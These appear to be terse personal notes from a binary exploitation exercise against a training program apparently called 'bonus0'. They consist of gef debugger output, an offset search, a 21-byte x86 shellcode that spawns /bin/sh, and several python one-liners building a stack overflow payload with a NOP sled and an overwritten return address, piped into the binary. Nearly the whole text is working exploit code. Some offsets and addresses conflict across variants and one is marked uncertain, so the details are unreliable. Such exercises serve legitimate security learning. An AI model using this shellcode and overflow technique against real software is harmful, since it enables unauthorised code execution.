gef➤  pattern offset 0x65616161
[+] Searching for '61616165'/'65616161' with period=4
[+] Found at offset 9 (little-endian search) likely

 stopped 0x65616161 in ?? (), reason: SIGSEGV

- buffer address = 0xbffff606
- shell code : ```\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80``` (21 bytes)
28
- offset = 13 ?

payload = shell code (20 byte) + \n +shell code (1byt) + Offset - 1 + buffer address

python3 -c 'import sys; sys.stdout.buffer.write(b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd" + b"A" * 4074 + b"\n" + b"\x80"+ b"\x90" * 12 + b"\xd6\xd2\xff\xff" + b"B" * 20 +  b"\n")'

entry buffer 4000 in p = 0xbfffe5e4

<(python2.7 -c 'import sys; sys.stdout.write(b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + b"\x90" * 4074 + b"\n" + b"\x80" + b"\x90" * 8 + b"\x06\xf6\xff\xbf" + b"B" * 20 + b"\n")')

cat <(python2.7 -c 'import sys; sys.stdout.write(b"\x90" * 100 + b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + b"\x90" * 3974 + b"\n" + b"\x90" * 9 + b"\xe4\xe5\xff\xbf" + b"B" * 20 + b"\n")') - | ./bonus0

gef➤  x/100xw 0xffffc2b4
0xffffc2b4:	0x99580b6a	0x2f2f6852	0x2f686873	0x896e6962
0xffffc2c4:	0xcdc931e3	0x90909080	0x90909090	0x90909090

entry buffer main = 0xbffff606